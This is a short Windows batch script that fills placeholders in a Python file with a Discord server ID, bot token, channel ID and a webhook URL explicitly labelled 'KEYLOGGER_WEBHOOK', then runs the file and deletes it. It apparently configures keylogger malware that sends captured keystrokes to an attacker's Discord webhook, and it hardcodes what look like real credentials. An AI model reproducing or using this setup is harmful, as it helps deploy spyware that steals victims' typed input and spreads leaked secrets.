@echo off
echo Testing configuration replacement...

REM Create test file
copy test_config.py test_configured.py >nul

REM Replace placeholders with actual values
powershell -Command "(Get-Content 'test_configured.py') -replace '\{GUILD_ID\}', '1375935187250057216' | Set-Content 'test_configured.py'"
powershell -Command "(Get-Content 'test_configured.py') -replace '\{BOT_TOKEN\}', 'MTM37NTkzNTQ5OTU0OTU0MDM3Mg.G0N_48.d3bL65IMOciVH89Ehi4oLjwWbf9yMRTKpIv41g' | Set-Content 'test_configured.py'"
powershell -Command "(Get-Content 'test_configured.py') -replace '\{CHANNEL_ID\}', '1375935188265209989' | Set-Content 'test_configured.py'"
powershell -Command "(Get-Content 'test_configured.py') -replace '\{KEYLOGGER_WEBHOOK\}', 'https://discord.com/api/webhooks/1375937047998501057/uyPon8TtX2_JLYwUvP_h0fZchDvpmfhsocI1OjPrHd4l-BOolP3XwFf4ymO4uguw5boA' | Set-Content 'test_configured.py'"

echo Running test...
python test_configured.py

echo.
echo Cleaning up...
del test_configured.py >nul 2>&1

pause
